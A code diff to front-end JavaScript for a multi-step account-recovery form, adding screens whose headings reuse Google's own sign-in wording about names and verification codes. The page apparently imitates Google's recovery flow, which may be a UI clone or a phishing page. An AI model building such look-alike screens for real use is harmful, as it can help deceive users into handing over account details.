@@ -1,6 +1,6 @@
 
-if (document.querySelectorAll('.group-i')) {
-
+if (document.querySelectorAll('.group-i') && document.getElementById('recover-button-email') &&
+    document.getElementById('recover-button-name')) {
     document.getElementById('recover-button-email').addEventListener('click', () => {
         verifyInputRecoverEmail();
     });
@@ -12,6 +12,7 @@ if (document.querySelectorAll('.group-i')) {
 
     let emailRecover = document.getElementById('recover-email');
     let nameRecover = document.getElementById('recover-name');
+    let envEmail = document.querySelector('.env-email-recover');
     function verifyInputRecoverEmail() {
         let count = 0;
         document.querySelectorAll('.group-i input').forEach(item => {
@@ -30,22 +31,25 @@ if (document.querySelectorAll('.group-i')) {
             }
             if (validateRecoverEmail(item.value) === true) {
                 verifyRecoverEmail(item.value).then(user => {
-                   if(user === '1'){
+                    if (user === '1') {
                         if (count === 1) {
                             emailRecover.style.display = "none";
                             nameRecover.style.display = "flex";
+                            let h2 = 'What’s your name?';
+                            let p = 'Enter the name on your Google Account';
+                            title(h2, p);
                         }
-                   }else{
-                         document.getElementById('error-11').classList.add('alert-error-fieldeset');
+                    } else {
+                        document.getElementById('error-11').classList.add('alert-error-fieldeset');
                         document.getElementById('msg-11').style.display = "flex";
-                        document.getElementById('msg-11').innerHTML="E-mail não encontrado";
-                   }
+                        document.getElementById('msg-11').innerHTML = "E-mail não encontrado";
+                    }
                 });
             }
         });
 
-       
-        
+
+
     }
 
     function verifyInputRecoverName() {
@@ -65,7 +69,11 @@ if (document.querySelectorAll('.group-i')) {
         });
 
         if (count === 2) {
-            alert();
+            nameRecover.style.display = 'none';
+            envEmail.style.display = 'flex';
+            let h2 = 'Get a verification code';
+            let p = 'To help keep your account safe, Google wants to make sure it’s really you trying to sign in';
+            title(h2, p);
         }
     }
 
@@ -86,5 +94,11 @@ if (document.querySelectorAll('.group-i')) {
             return '1';
         }
 
+    }
+    function title(h1, p) {
+        document.querySelectorAll('.group-title').forEach(item => {
+            item.querySelector('h2').innerHTML = h1;
+            item.querySelector('p').innerHTML = p;
+        });
     }
 }
